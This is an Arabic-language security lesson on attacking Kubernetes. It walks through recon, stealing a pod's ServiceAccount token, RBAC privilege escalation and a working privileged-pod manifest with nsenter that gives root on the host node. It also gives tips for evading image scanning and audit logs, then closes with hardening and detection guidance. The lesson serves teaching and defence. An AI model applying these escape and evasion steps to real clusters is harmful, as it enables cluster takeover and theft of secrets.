# اختراق كوبرنيتيس: من &quot;الحاوية&quot; إلى السيطرة الكاملة على الـ Cluster

K8s دلوقتي بقى المخزن الحقيقي لكل الـ Credentials والـ Secrets. لو دخلته، إنت مش بس وصلت لتطبيق واحد. وصلت لـ:
- كل الـ secrets (DB passwords, API keys, JWT signing keys)
- كل الـ service-to-service communication
- الـ cloud metadata (IAM roles)
- وفي بعض الإعدادات السيئة: الـ Node نفسه

في 2023، Tesla وWeight Watchers وغيرهم اتخرقوا عن طريق Kubernetes Dashboards مكشوفة من غير مصادقة. اللي بيظن إن &quot;cluster داخلي&quot; معناه &quot;آمن&quot;، بيعك في وقته.

في الدرس ده، هنمشي مع المهاجم خطوة بخطوة: من أول Pod بسيط، لحد ما يسيطر بالكامل على الـ Control Plane.

> [!warning] تنبيه هام
> طبّق التقنيات دي فقط في بيئة معملية (Lab) زي KubeGoat أو Kubernetes Goat. أي تعديل غلط في صلاحيات الـ RBAC على cluster حقيقي ممكن يوقّف الشغل ويسبّب كارثة.

## إزاي المهاجم بيشوف الـ Cluster؟ (Threat Model)

![بيئة هجوم كوبرنيتيس](/images/lessons/kubernetes_attack_surface_en.png)

عندنا 5 مداخل رئيسية لأي هجوم:

1. تسريب ملفات الـ **kubeconfig** (في GitHub repos، CI logs، developer laptops).
2. الـ **APIs** أو لوحات التحكم المكشوفة للإنترنت.
3. التطبيقات الضعيفة اللي شغّالة جوّه الـ cluster.
4. الـ **kubelet** لو مش متأمّن كويس (port 10250).
5. الصور (**images**) الملغّمة في مراحل الـ supply chain.

غلطات الـ junior في الـ recon:
- بيشغّل nuclei بكل الـ templates ومتفاجئ إن الـ alerts بتشتعل.
- بينسى يفحص <code>/.well-known/openid-configuration</code> و metadata endpoints قبل أي حاجة.
- بيتجاهل subdomain enumeration على الـ ingress — كل ingress = surface مختلف.

## 1. الاستطلاع (Reconnaissance) — إيه اللي مكشوف بره؟

```terminal
# البحث عن واجهات Kubernetes مكشوفة
shodan search 'product:"Kubernetes"'              # ليه: API server بيرد بـ banner مميز
shodan search 'http.title:"Kubernetes Dashboard"' # ليه: Dashboard مكشوف = خبر سيء جداً

# لو لقيت IP، جرّب dashboard أو anonymous auth
kubectl --insecure-skip-tls-verify --server=https://API:6443 get nodes

# لو اشتغلت معاك، شوف صلاحياتك
kubectl --insecure-skip-tls-verify --server=https://API:6443 auth can-i --list
# ليه auth can-i: بيقولك بدقة إيه اللي تقدر تعمله من غير ما تجرّب وتسبّب alerts
```

## 2. من اختراق الـ Pod للسيطرة على الـ Cluster

لو المهاجم اخترق تطبيق شغّال جوّه Pod (مثلاً عن طريق SSRF أو RCE)، أول حاجة بيعملها:

```terminal
# تجميع الـ Token والمعلومات الأساسية
ls /var/run/secrets/kubernetes.io/serviceaccount/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
# ليه: الـ ServiceAccount token بيتحقن في كل pod افتراضياً — هدية مغلّفة

# فحص صلاحيات الـ ServiceAccount الحالي
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}"
# ليه: بدل ما تخمّن، الـ API هيقولك بالظبط انت تقدر تعمل إيه
```

## 3. ثغرات الـ RBAC — إزاي تصعّد صلاحياتك؟

الـ RBAC بيحدّد مين يعمل إيه. فيه صلاحيات لو لقيتها، فأنت تقريباً بقيت root على الـ cluster:

| الصلاحية (Verb) | ليه هي خطيرة جداً؟ |
|------------------|---------------------|
| `create pods` | تقدر تشغّل Pod جديد بـ privileged mode وتوصل لملفات الـ Host وتهرب للـ Node. |
| `get/list secrets` | هتقرا كل الـ tokens، وغالباً هتلاقي token لـ admin. |
| `impersonate` | تتقمّص شخصية أي user تاني، حتى الـ cluster admin. |
| `bind` | تربط نفسك بدور (Role) عالي جداً. |
| `escalate` | اخلق Role بصلاحيات أعلى من اللي عندك. |
| `patch deployments/daemonsets` | تعدّل deployment موجود وتحقن image خبيث. |

**مثال: الهروب للـ Node عن طريق `create pods`**

```terminal
# تشغيل Pod بـ Privileged Mode بيوصل لملفات الـ Host
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata: { name: pwn, namespace: default }
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    command: ["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","sh"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes: [{ name: host, hostPath: { path: / } }]
EOF
# ليه nsenter --target 1: بيدخلك في namespace العملية رقم 1 (init) على الـ Host

kubectl exec -it pwn -- sh
# مبروك، انت دلوقتي root على الـ Node المضيفة.
```

غلطات الـ junior:
- بيلاقي `create pods` ويشغّل nginx عادي — ضيّع فرصة. شغّل Pod بـ privileged + hostPath وانت root على الـ Node في 5 ثواني.
- بيستخدم image مشبوه (`evilattacker/pwn:latest`) — image scanning هيرفعه فوراً. استخدم `alpine` أو `busybox` ويغيّر الـ command بس.
- بينسى يمسح الـ Pod بعد ما يخلّص — Audit log فاضحه.

## 4. فنون الهروب من الـ Pod (Escape Techniques)

حتى لو الـ cluster متأمّن بـ policies تمنع `privileged: true`، فيه طرق تانية للهروب:

- **hostNetwork: true**: تكلّم الـ kubelet مباشرة (port 10250) أو الـ Cloud Metadata (IMDS).
- **hostPath: /**: اكتب في ملفات الـ cron أو ضيف مفتاح SSH بتاعك للـ root.
- **Docker Socket**: لو لقيت `/var/run/docker.sock` ممرّر للـ Pod، تقدر تشغّل أي container تاني وتتحكّم في الـ Host. ده أكتر misconfiguration شائع في dev environments.
- **CAP_SYS_ADMIN أو CAP_SYS_PTRACE**: حتى من غير privileged، الـ capabilities دي بتدّيك escape paths.
- **Linux kernel exploit**: لو الـ Node على kernel قديم، DirtyPipe أو nf_tables هيخرّجوك من container.

## 5. الـ etcd: &quot;الخزنة&quot; اللي فيها كل حاجة

الـ etcd بيتخزّن فيه كل أسرار الـ cluster. لو المهاجم وصل له (port 2379) من غير حماية، اللعبة خلصت.

> [!danger] قاعدة ذهبية
> الوصول للـ etcd = السيطرة الكاملة. عامل ملفات الـ etcd بنفس الحذر اللي بتعامل بيه NTDS.dit في Active Directory. ده مش مبالغة — ده الواقع.

في 2018، Tesla اتخرقوا لأن Kubernetes Dashboard كانت مكشوفة من غير مصادقة → المهاجم لقى credentials لـ AWS داخل الـ pods → شغّل cryptominers على bill Tesla. السطر الأول في الحكاية كان dashboard مكشوف. مفيش kernel exploit، مفيش 0-day. مجرد إعداد عك.

## 6. أولويات الحماية (إزاي تسد الثغرات دي؟)

1. **اقفل الـ Anonymous Auth** على API Server و kubelet. ده الباب الكبير.
2. **استخدم Pod Security Standards** (Restricted profile). امنع privileged و hostPath و hostNetwork.
3. **التقسيم الشبكي (Network Policies)** بـ default-deny. الـ Pods ما بتكلّم بعضها إلا في أضيق الحدود.
4. **شفّر الـ Secrets** at-rest باستخدام KMS provider (AWS KMS, GCP KMS, Azure Key Vault).
5. **راقب الـ Audit Logs** — كل `secrets/get` أو `pods/exec` لازم يبقى مرصود. SIEM rules ضرورية.
6. **Image scanning في CI/CD** + signed images (Cosign, Notation).
7. **Service Account tokens محدّدة المدة** (BoundServiceAccountTokenVolume — default من v1.22).
8. **automountServiceAccountToken: false** للـ pods اللي ما بتحتاجش API access.

## ملخص الرصد (Detection)

| المصدر | إيه اللي تراقبه؟ |
|-----------|-----------|
| **Audit Logs** | أي `pods/exec` في prod = صرخة. |
| **API Server** | محاولات قراءة secrets من ServiceAccounts ما اتعملتش لده. |
| **Node Logs** | Pod بـ hostPath `/` أو `/var/run/docker.sock`. |
| **Network Traffic** | أي تواصل مع port 2379 (etcd) من بره الـ control plane. |
| **Falco/Tetragon** | runtime detection للـ container escapes. |

## الخلاصة الناشفة

K8s مش &quot;معقّد لدرجة إن مفيش حد بيخترقه&quot;. لأ. ده &quot;معقّد لدرجة إن المدافع مش فاهم الـ surface كامل&quot;. الفرق مش ضد المهاجم.

اللي بيكسب في K8s مش اللي بيشغّل أحدث CNCF tool. اللي بيكسب اللي قاعد يقرا audit logs كل صبح، عارف الـ ServiceAccounts كلها بأسمائها، وعنده default-deny network policy.

ولو فات عليك Pod بـ `privileged: true` في prod، يبقى مش بتراقب. بتتفرّج.
